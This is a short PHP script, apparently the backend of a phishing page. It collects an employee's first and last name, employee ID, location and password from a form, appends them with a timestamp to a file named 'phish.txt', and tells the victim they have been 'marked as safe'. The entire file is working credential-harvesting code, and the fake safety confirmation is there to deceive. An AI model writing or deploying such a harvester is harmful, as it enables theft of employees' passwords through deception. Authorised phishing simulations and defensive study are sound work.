<?php
    $time = date("h:i:sa");
    $day = date("Y-m-d");
    $file = fopen("phish.txt", "a");
    $txt = 
        "\nFirst Name : ".$_POST['firstname']." | Last Name: ".$_POST['lastname']." | Employee ID: ".$_POST['id']." | Location: ".$_POST['location']." | Password: ".$_POST['password']." | Time of data entry: ".$day." at ".$time;
        
    fwrite($file, $txt);
    fclose($file);


echo "Thank you, ".$_POST['firstname']."! You have been marked as safe. Please continue to check your email for any other alerts or updates.";


?> 